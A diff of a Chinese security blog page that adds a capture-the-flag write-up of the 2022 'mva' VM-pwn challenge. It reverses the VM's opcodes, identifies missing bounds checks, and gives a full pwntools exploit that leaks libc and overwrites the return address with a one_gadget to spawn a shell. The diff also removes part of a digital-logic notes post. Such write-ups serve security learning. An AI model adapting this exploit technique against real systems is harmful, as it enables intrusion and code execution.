@@ -150,6 +150,172 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/02/28/%E8%99%8E%E7%AC%A6CTF-2022-mva-%E9%A2%98%E8%A7%A3/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="CoLin">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="CoLin's BLOG">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/02/28/%E8%99%8E%E7%AC%A6CTF-2022-mva-%E9%A2%98%E8%A7%A3/" class="post-title-link" itemprop="url">虎符CTF-2022 mva 题解</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-02-28 23:18:07" itemprop="dateCreated datePublished" datetime="2023-02-28T23:18:07+08:00">2023-02-28</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-03-02 17:02:38" itemprop="dateModified" datetime="2023-03-02T17:02:38+08:00">2023-03-02</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/write-ups/" itemprop="url" rel="index"><span itemprop="name">write-ups</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/write-ups/%E5%85%B6%E4%BB%96/" itemprop="url" rel="index"><span itemprop="name">其他</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>7.9k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>7 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>这是一道vm题。前几天师傅让我看看这道题，发现是一种没有做过的类型。查询相关资料之后有了一定的了解。由于是第一次做这种题，就将wp写的尽可能详细一些，作为笔记备查。</p>
+<p>源文件：<a target="_blank" rel="noopener" href="https://github.com/Hornos3/pwnfile">my_github</a></p>
+<p>vm-pwn是一种虚拟机pwn，我的理解是，我们自己用C语言写一个虚拟机。在这个虚拟机里面可以进行各种操作，如加减乘除、堆栈操作等。这里各种操作的操作码可以是我们自己定义的，比如我们定义01开头的指令为加，02开头为减，等等。我们不管当前的主流架构是怎么实现的，这个程序本身相当于是”发明“了一种小型的轻量级的汇编语言。我们需要找到这种语言的漏洞以跳出虚拟机，进而getshell或getflag。</p>
+<p>大致了解了这种题目的背景之后，我们就可以进去看题了。</p>
+<p><img src="1.png" alt="" /></p>
+<p>指令首先是写在了bss段的一个地方，在main函数中有一个死循环，里面的sub_11E9函数应该就是读取指令的函数了。改名为read_cmd。</p>
+<p>这里反汇编看着不太清楚，还是要深入到汇编去查看。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000001213                 lea     rdx, code</span><br><span class="line">.text:000000000000121A                 add     rax, rdx</span><br><span class="line">.text:000000000000121D                 mov     eax, [rax]</span><br><span class="line">.text:000000000000121F                 mov     [rbp+var_C], eax</span><br><span class="line">.text:0000000000001222                 mov     eax, [rbp+var_C]</span><br><span class="line">.text:0000000000001225                 shr     eax, 18h</span><br><span class="line">.text:0000000000001228                 mov     edx, eax</span><br><span class="line">.text:000000000000122A                 mov     eax, [rbp+var_C]</span><br><span class="line">.text:000000000000122D                 shr     eax, 8</span><br><span class="line">.text:0000000000001230                 and     eax, 0FF00h</span><br><span class="line">.text:0000000000001235                 or      edx, eax</span><br><span class="line">.text:0000000000001237                 mov     eax, [rbp+var_C]</span><br><span class="line">.text:000000000000123A                 shl     eax, 8</span><br><span class="line">.text:000000000000123D                 and     eax, 0FF0000h</span><br><span class="line">.text:0000000000001242                 or      edx, eax</span><br><span class="line">.text:0000000000001244                 mov     eax, [rbp+var_C]</span><br><span class="line">.text:0000000000001247                 shl     eax, 18h</span><br><span class="line">.text:000000000000124A                 or      eax, edx</span><br></pre></td></tr></table></figure>
+<p>上面这一段汇编是read_cmd里面的，主要功能就是从输入的指令中读取4字节后将这4字节高位变低位，低位变高位（从小端序到大端序的转换）。在read_cmd返回后，eax中存放的就是读取到的指令。读取指令后返回到main函数中，一开始看到main函数下面有很多没有解析的部分，将其手动转为汇编代码，发现有很多跳转指令，那么基本可以判断出，下面就是解析并执行指令的部分了。跳转指令应该是在判断指令的类型。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">.text:000000000000135E                 mov     eax, 0</span><br><span class="line">.text:0000000000001363                 call    read_cmd</span><br><span class="line">.text:0000000000001368                 mov     [rbp+var_23C], eax</span><br><span class="line">.text:000000000000136E                 mov     eax, [rbp+var_23C]</span><br><span class="line">.text:0000000000001374                 shr     eax, 18h</span><br><span class="line">.text:0000000000001377                 mov     [rbp+var_240], ax</span><br><span class="line">.text:000000000000137E                 mov     eax, [rbp+var_23C]</span><br><span class="line">.text:0000000000001384                 sar     eax, 10h</span><br><span class="line">.text:0000000000001387                 mov     [rbp+var_249], al</span><br><span class="line">.text:000000000000138D                 mov     eax, [rbp+var_23C]</span><br><span class="line">.text:0000000000001393                 sar     ax, 8</span><br><span class="line">.text:0000000000001397                 mov     [rbp+var_248], al</span><br><span class="line">.text:000000000000139D                 mov     eax, [rbp+var_23C]</span><br><span class="line">.text:00000000000013A3                 mov     [rbp+var_247], al</span><br><span class="line">.text:00000000000013A9                 mov     eax, [rbp+var_23C]</span><br><span class="line">.text:00000000000013AF                 mov     [rbp+var_23E], ax</span><br></pre></td></tr></table></figure>
+<p>在调用read_cmd函数之后，main函数将指令的不同位保存到栈中不同的位置，但这些位置基本上相邻。</p>
+<p>下图为栈中保存的指令值情况（假设读取的指令为0x76543210）</p>
+<table align=center>
+<tr align=center>
+	<td> addr </td> <td> +0 </td> <td> +1 </td> <td> +2 </td> <td> +3 </td>
+	<td> +4 </td> <td> +5 </td> <td> +6 </td> <td> +7 </td>
+</tr>
+<tr align=center>
+	<td> rbp-0x250 </td> <td> - </td> <td> - </td> <td> - </td> <td> - </td>
+	<td> - </td> <td> - </td> <td> - </td> <td> 32 </td>
+</tr>
+<tr align=center>
+	<td> rbp-0x248 </td> <td> 54 </td> <td> 76 </td> <td> - </td> <td> - </td>
+	<td> - </td> <td> - </td> <td> - </td> <td> - </td>
+</tr>
+<tr align=center>
+	<td> rbp-0x240 </td> <td> 10 </td> <td> - </td> <td> 76 </td> <td> 54 </td>
+	<td> 76 </td> <td> 54 </td> <td> 32 </td> <td> 10 </td>
+</tr>
+</table>
+<p>之后判断原输入的最低位是否大于0xF，如果大于则跳过该指令。这说明这个虚拟机中的指令码只可能有0x0~0xF最多16种。我们修改一下输入，然后接着跟着执行流一步一步走。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">.rodata:000000000000206C dword_206C      dd 0FFFFF38Bh           ; DATA XREF: main+134↑o</span><br><span class="line">.rodata:000000000000206C                                         ; main+140↑o</span><br><span class="line">.rodata:0000000000002070                 dd 0FFFFF399h</span><br><span class="line">.rodata:0000000000002074                 dd 0FFFFF3D2h</span><br><span class="line">.rodata:0000000000002078                 dd 0FFFFF460h</span><br><span class="line">.rodata:000000000000207C                 dd 0FFFFF4F0h</span><br><span class="line">.rodata:0000000000002080                 dd 0FFFFF57Eh</span><br><span class="line">.rodata:0000000000002084                 dd 0FFFFF60Ch</span><br><span class="line">.rodata:0000000000002088                 dd 0FFFFF686h</span><br><span class="line">.rodata:000000000000208C                 dd 0FFFFF714h</span><br><span class="line">.rodata:0000000000002090                 dd 0FFFFF735h</span><br><span class="line">.rodata:0000000000002094                 dd 0FFFFF7A7h</span><br><span class="line">.rodata:0000000000002098                 dd 0FFFFF80Ah</span><br><span class="line">.rodata:000000000000209C                 dd 0FFFFF839h</span><br><span class="line">.rodata:00000000000020A0                 dd 0FFFFF8B4h</span><br><span class="line">.rodata:00000000000020A4                 dd 0FFFFF940h</span><br><span class="line">.rodata:00000000000020A8                 dd 0FFFFF994h</span><br></pre></td></tr></table></figure>
+<p>接下来，程序提到了rodata中的这个地方，这里发现这个未知数据的长度为64字节，正好是16*4，每一个4字节对应一条指令，但具体含义尚不清楚。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000000013D6                 lea     rdx, ds:0[rax*4]</span><br><span class="line">.text:00000000000013DE                 lea     rax, dword_206C</span><br><span class="line">.text:00000000000013E5                 mov     eax, [rdx+rax]</span><br><span class="line">.text:00000000000013E8                 cdqe</span><br><span class="line">.text:00000000000013EA                 lea     rdx, dword_206C</span><br><span class="line">.text:00000000000013F1                 add     rax, rdx</span><br><span class="line">.text:00000000000013F4                 db      3Eh</span><br><span class="line">.text:00000000000013F4                 jmp     rax</span><br></pre></td></tr></table></figure>
+<p>往下看不远处，我们就知道这个64字节数据是用来干嘛的了。它起始就是一个地址的偏移量，将对应指令的偏移量加上rodata的地址值，得到的就是指令对应的执行部分的地址。将其重命名为exec_offset。</p>
+<p>…</p>
+<p>经过亿段时间的分析之后，我大概搞清楚了其中一些指令的含义。</p>
+<p>在这个虚拟机中一共有6个word类型的寄存器，这6个寄存器通过偏移获取。在这16种指令中有加减乘除、与或异或等算数指令，这些指令需要3个操作数。格式为：（下面所有格式均为高地址到低地址，在写入时需要调换一下顺序）</p>
+<blockquote>
+<p>指令码: 2, 功能: 加法, 格式: op1 op2 op3 0x2——reg(op3) = reg(op1) + reg(op2)<br />
+指令码: 3, 功能: 减法, 格式: op1 op2 op3 0x3——reg(op3) = reg(op2) - reg(op1)<br />
+指令码: 4, 功能: 按位与, 格式: op1 op2 op3 0x4——reg(op3) = reg(op2) &amp; reg(op1)<br />
+指令码: 5, 功能: 按位或, 格式: op1 op2 op3 0x5——reg(op3)= reg(op2) | reg(op1)<br />
+指令码: 6, 功能: 右移, 格式: op1 op2 op3 0x6——reg(op3) = reg(op3) &gt;&gt; reg(op2)<br />
+指令码: 7, 功能: 按位异或, 格式: op1 op2 op3 0x7——reg(op3) = reg(op1) ^ reg(op2)<br />
+指令码: 13, 功能: 乘法, 格式: op1 op2 op3 0xD——reg(op3) = reg(op1) * reg(op2) 【注意这里没有检查op2的范围，是一个漏洞】</p>
+</blockquote>
+<p>除此之外，还有一些其他类型的指令，这里也列举一下。</p>
+<blockquote>
+<p>指令码: 0, 功能: 退出, 格式: op1 op2 op3 0x0——exit()<br />
+指令码: 1, 功能: 赋值, 格式: op1 op2 op3 0x1——reg(op3) = op1 + op2 &gt;&gt; 8 (op1 = LOBYTE(op3), op2 = HIBYTE(op3))<br />
+指令码: 9, 功能: 入栈, 格式: op1 op2 op3 0x9——若op3 == 0则push (reg(0))，若op3 != 0则push (op1 + op2 &gt;&gt; 8) 【注意这里虽然有对栈是否满的检查，但是没有对op3大小的检查，可以push虚拟机空间之外的东西，是一个漏洞】<br />
+指令码: 10, 功能: 出栈, 格式: op1 op2 op3 0xA——reg(op3) = pop()【这里有对op3大小和栈是否为空的检查】<br />
+指令码: 12, 功能: 比较两个寄存器的值是否相等。因为返回相等的控制位没有被其他指令所引用，因此这里不做分析。<br />
+指令码: 14, 功能: 寄存器赋值, 格式: op1 op2 op3 0xE——reg(op2) = reg(op3)【注意这里没有检查op2是否为负数，是一个漏洞】<br />
+指令码: 15, 功能: 输出栈顶的值（这里指的是没有被占用的地方，也就是栈实际占用空间还往上一个字的值，这个字现在实际上并没有进入堆栈）</p>
+</blockquote>
+<p>还有8和11的指令码没有分析，不过从官方wp上看这两个应该是无关紧要的，就暂且不管了。</p>
+<p>然后我们需要整理一下思路，想想如何才能利用上面的漏洞getshell。</p>
+<p>要想getshell，首先要拿到libc加载地址，通过这个加载地址得到one_gadget的地址，然后需要将one_gadget地址写入返回地址中。整个过程看似简单，但首先第一个问题：如何拿到libc加载地址？</p>
+<p>注意到赋值操作中目的操作数是没有检查负数的情况的，经过IDA调试发现栈指针在寄存器的低地址处，我们可以让目的操作数为负进而指向栈指针，这样我们就可以用寄存器中的值去覆盖栈指针的值。栈指针是一个8字节结构，对应赋值的偏移应为0xF6、0xF7、0xF8、0xF9，我们将0xF6偏移位置覆盖为0x8000即可让栈指针变为负数。在输出值（指令码0xF）时，这个最高位的0x8000会溢出，从而我们可以读取寄存器后面任何一个位置的地址。经过试验发现，栈指针为0x10C时对应main返回地址最低字，即__libc_start_main+243。我们读取0x10C、0x10D、0x10E三个字的值就可以完全掌握libc的加载地址了。注意这里读取不用0xF指令，因为它只有输出功能，等脚本读到输出之后你的小程序早就执行完了。因此这里使用pop指令，它只会检查栈指针是否为0，因此可以绕过。</p>
+<p><img src="2.png" alt="" /></p>
+<p>在pop之后，我们获得了libc的加载地址，这里需要进行一些计算来获得one_gadget的地址。然后我们将其push到返回地址处就可以了。这里需要注意的是，由于每一个寄存器只有2字节长度，因此返回地址需要用3个寄存器存储，在计算的时候会忽略向高位的借位，因此可能在计算时出错，但这是一个小概率事件，大约有1/4的概率会失败。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.text:00005607BDE667A1 case_9:                                 ; *** code: 9</span><br><span class="line">.text:00005607BDE667A1 mov     rax, [rbp+var_230]              ;     function: if var_230(?) &lt;= 100h then exit</span><br><span class="line">.text:00005607BDE667A1                                         ;               else then ???</span><br><span class="line">.text:00005607BDE667A8 cmp     rax, 100h</span><br><span class="line">.text:00005607BDE667AE jle     short loc_5607BDE667BA</span><br><span class="line">.text:00005607BDE667B0 mov     edi, 0                          ; status</span><br><span class="line">.text:00005607BDE667B5 call    _exit</span><br></pre></td></tr></table></figure>
+<p>请注意上面的代码片段，这是检查栈指针是否大于100。但是跳转是jle，这表示它是有符号的比较。那也就是说如果栈指针是一个负数，如果看做无符号数的话是一个很大的数，但也能通过检查，这就为我们写入返回地址创造了条件。</p>
+<p>因此，大致的步骤就是：</p>
+<p>Step 1: 修改栈指针到返回地址处<br />
+Step 2: 读取返回地址<br />
+Step 3: 计算one_gadget地址<br />
+Step 4: 写入返回地址<br />
+Step 5: getshell</p>
+<p>payload:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./mva&#x27;</span>)</span><br><span class="line">Libc_libc_start_main = <span class="number">0x23FC0</span></span><br><span class="line">Libc_one_gadget = <span class="number">0xE3B31</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_command</span>(<span class="params">code, op1, op2, op3</span>):</span><br><span class="line">	<span class="keyword">return</span> p8(code) + p8(op1) + p8(op2) + p8(op3)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">movl</span>(<span class="params">reg, value</span>):</span><br><span class="line">	<span class="keyword">return</span> get_command(<span class="number">1</span>, reg, value &gt;&gt; <span class="number">8</span>, value &amp; <span class="number">0xFF</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">dest, add1, add2</span>):</span><br><span class="line">	<span class="keyword">return</span> get_command(<span class="number">2</span>, dest, add1, add2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sub</span>(<span class="params">dest, subee, suber</span>):</span><br><span class="line">	<span class="keyword">return</span> get_command(<span class="number">3</span>, dest, subee, suber)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">band</span>(<span class="params">dest, and1, and2</span>):</span><br><span class="line">	<span class="keyword">return</span> get_command(<span class="number">4</span>, dest, and1, and2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bor</span>(<span class="params">dest, or1, or2</span>):</span><br><span class="line">	<span class="keyword">return</span> get_command(<span class="number">5</span>, dest, or1, or2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sar</span>(<span class="params">dest, off</span>):</span><br><span class="line">	<span class="keyword">return</span> get_command(<span class="number">6</span>, dest, off, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bxor</span>(<span class="params">dest, xor1, xor2</span>):</span><br><span class="line">	<span class="keyword">return</span> get_command(<span class="number">7</span>, dest, xor1, xor2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">push</span>(<span class="params">reg, value</span>):</span><br><span class="line">	<span class="keyword">if</span> reg == <span class="number">0</span>:</span><br><span class="line">		<span class="keyword">return</span> get_command(<span class="number">9</span>, reg, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="keyword">return</span> get_command(<span class="number">9</span>, reg, value &gt;&gt; <span class="number">8</span>, value &amp; <span class="number">0xFF</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pop</span>(<span class="params">reg</span>):</span><br><span class="line">	<span class="keyword">return</span> get_command(<span class="number">10</span>, reg, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">imul</span>(<span class="params">dest, imul1, imul2</span>):</span><br><span class="line">	<span class="keyword">return</span> get_command(<span class="number">13</span>, dest, imul1, imul2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mov</span>(<span class="params">src, dest</span>):</span><br><span class="line">	<span class="keyword">return</span> get_command(<span class="number">14</span>, src, dest, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">print_top</span>():</span><br><span class="line">	<span class="keyword">return</span> get_command(<span class="number">15</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 1: get __libc_start_main + 243</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += movl(<span class="number">0</span>, <span class="number">0x8000</span>)</span><br><span class="line">payload += mov(<span class="number">0</span>, <span class="number">0xF9</span>)			<span class="comment"># bypass the check by making it nagative</span></span><br><span class="line"></span><br><span class="line">payload += movl(<span class="number">0</span>, <span class="number">0x010F</span>)</span><br><span class="line">payload += mov(<span class="number">0</span>, <span class="number">0xF6</span>)</span><br><span class="line">payload += pop(<span class="number">0</span>)				<span class="comment"># HIGH WORD of __libc_start_main</span></span><br><span class="line">payload += pop(<span class="number">1</span>)				<span class="comment"># MIDDLE WORD of __libc_start_main</span></span><br><span class="line">payload += pop(<span class="number">2</span>)				<span class="comment"># LOW WORD of __libc_start_main</span></span><br><span class="line"></span><br><span class="line">payload += movl(<span class="number">3</span>, <span class="number">243</span>)</span><br><span class="line">payload += sub(<span class="number">2</span>, <span class="number">2</span>, <span class="number">3</span>)			<span class="comment"># this step may fail due to the ignorance of borrowed bit, but in 1/16 to fail</span></span><br><span class="line"><span class="comment"># __libc_start_main got</span></span><br><span class="line"></span><br><span class="line">payload += movl(<span class="number">3</span>, <span class="number">0x3FC0</span>)		<span class="comment"># this step may also fail due to same reason, 1/4 to fail until now</span></span><br><span class="line">payload += sub(<span class="number">2</span>, <span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line">payload += movl(<span class="number">3</span>, <span class="number">0x2</span>)</span><br><span class="line">payload += sub(<span class="number">1</span>, <span class="number">1</span>, <span class="number">3</span>)</span><br><span class="line"><span class="comment"># libc load address got</span></span><br><span class="line"></span><br><span class="line">payload += movl(<span class="number">3</span>, <span class="number">0x3B31</span>)</span><br><span class="line">payload += add(<span class="number">2</span>, <span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line">payload += movl(<span class="number">3</span>, <span class="number">0xE</span>)</span><br><span class="line">payload += add(<span class="number">1</span>, <span class="number">1</span>, <span class="number">3</span>)</span><br><span class="line"><span class="comment"># one_gadget address got</span></span><br><span class="line"></span><br><span class="line">payload += mov(<span class="number">0</span>, <span class="number">3</span>)</span><br><span class="line">payload += mov(<span class="number">2</span>, <span class="number">0</span>)</span><br><span class="line">payload += push(<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">payload += mov(<span class="number">1</span>, <span class="number">0</span>)</span><br><span class="line">payload += push(<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">payload += mov(<span class="number">3</span>, <span class="number">0</span>)</span><br><span class="line">payload += push(<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line"><span class="comment"># write one_gadget address to return_addr</span></span><br><span class="line"></span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += <span class="string">b&#x27;\n&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># for c in payload:</span></span><br><span class="line"><span class="comment"># 	print(&#x27;%02x&#x27; % c, end=&#x27; &#x27;)</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;[+] Welcome to MVA, input your code now :&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<p><img src="3.png" alt="" /></p>
+<p>当shell拿到之后，我们发现这种题目其实并不难，只要计算一下地址然后写入就行了。就是分析代码比较麻烦，需要明确每一种指令分别代表什么含义，找到里面的漏洞进而思考如何getshell。从这道题可以看出，vm-pwn题中最为致命的就是堆栈检查不严格，可能会产生任意地址读写漏洞，还有整型溢出问题也值得关注。</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/02/28/%E8%99%8E%E7%AC%A6CTF-2022-babygame-%E9%A2%98%E8%A7%A3/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -2137,201 +2303,6 @@ Z_2=\overline{A_2}A_0+\overline{A_3}A_1+A_3\overline{A_1}+A_2\overline{A_0}</ann
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/02/28/%E6%95%B0%E5%AD%97%E9%80%BB%E8%BE%91-Chapter-2%E2%80%94%E2%80%94%E9%80%BB%E8%BE%91%E4%BB%A3%E6%95%B0%E5%9F%BA%E7%A1%80/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="CoLin">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="CoLin's BLOG">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/02/28/%E6%95%B0%E5%AD%97%E9%80%BB%E8%BE%91-Chapter-2%E2%80%94%E2%80%94%E9%80%BB%E8%BE%91%E4%BB%A3%E6%95%B0%E5%9F%BA%E7%A1%80/" class="post-title-link" itemprop="url">数字逻辑 Chapter 2——逻辑代数基础</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2023-02-28 23:08:22" itemprop="dateCreated datePublished" datetime="2023-02-28T23:08:22+08:00">2023-02-28</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-03-01 11:31:47" itemprop="dateModified" datetime="2023-03-01T11:31:47+08:00">2023-03-01</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E8%AF%BE%E5%86%85%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">课内笔记</span></a>
-                </span>
-                  ，
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E8%AF%BE%E5%86%85%E7%AC%94%E8%AE%B0/%E6%95%B0%E5%AD%97%E9%80%BB%E8%BE%91/" itemprop="url" rel="index"><span itemprop="name">数字逻辑</span></a>
-                </span>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>1.8k</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>2 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="21-逻辑代数基本概念"><a class="markdownIt-Anchor" href="#21-逻辑代数基本概念"></a> 2.1 逻辑代数基本概念</h1>
